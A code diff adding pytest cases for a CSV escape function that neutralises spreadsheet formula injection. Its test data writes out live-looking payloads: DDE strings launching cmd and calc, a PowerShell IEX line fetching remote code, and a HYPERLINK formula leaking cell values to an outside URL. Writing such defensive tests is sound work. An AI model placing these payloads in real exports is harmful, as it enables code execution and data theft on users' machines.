@@ -4,9 +4,10 @@ from decimal import Decimal
 import pytest
 
 from datahub.core.csv import (
-    _transform_csv_value,
     csv_iterator,
+    escape,
     INCOMPLETE_CSV_MESSAGE,
+    transform_csv_value,
 )
 
 
@@ -68,8 +69,57 @@ def test_csv_iterator_with_error():
             'HELLO',
             'HELLO',
         ),
+        # Escape potentially dangerous values
+        (
+            "=cmd|' /c calc'!'A1",
+            "'=cmd\\|' /c calc'!'A1",
+        ),
     ),
 )
 def test_transform_csv_value(value, expected_value):
     """Test transform csv value"""
-    assert _transform_csv_value(value) == expected_value
+    assert transform_csv_value(value) == expected_value
+
+
+@pytest.mark.parametrize('value,expected_value', [
+    # Sample dangerous payloads
+    ('=1+1', "'=1+1"),
+    ('-1+1', "'-1+1"),
+    ('+1+1', "'+1+1"),
+    ('=1+1', "'=1+1"),
+    ('@A3', "'@A3"),
+    ('%1', "'%1"),
+    ('|1+1', "'\\|1+1"),
+    ('=1|2', "'=1\\|2"),
+    # https://blog.zsec.uk/csv-dangers-mitigations/
+    ("=cmd|' /C calc'!A0", "'=cmd\\|' /C calc'!A0"),
+    (
+        "=cmd|' /C powershell IEX(wget 0r.pe/p)'!A0",
+        "'=cmd\\|' /C powershell IEX(wget 0r.pe/p)'!A0",
+    ),
+    (
+        "@SUM(1+1)*cmd|' /C calc'!A0",
+        "'@SUM(1+1)*cmd\\|' /C calc'!A0",
+    ),
+    (
+        "@SUM(1+1)*cmd|' /C powershell IEX(wget 0r.pe/p)'!A0",
+        "'@SUM(1+1)*cmd\\|' /C powershell IEX(wget 0r.pe/p)'!A0",
+    ),
+    # https://hackerone.com/reports/72785
+    (
+        "-2+3+cmd|' /C calc'!A0",
+        "'-2+3+cmd\\|' /C calc'!A0",
+    ),
+    # https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/
+    (
+        '=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for info")',
+        '\'=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for info")',
+    ),
+])
+def test_escape(value, expected_value):
+    """
+    Test csv escapes potentially malicious values.
+
+    Test cases taken from https://github.com/raphaelm/defusedcsv/blob/master/tests/test_escape.py
+    """
+    assert escape(value) == expected_value
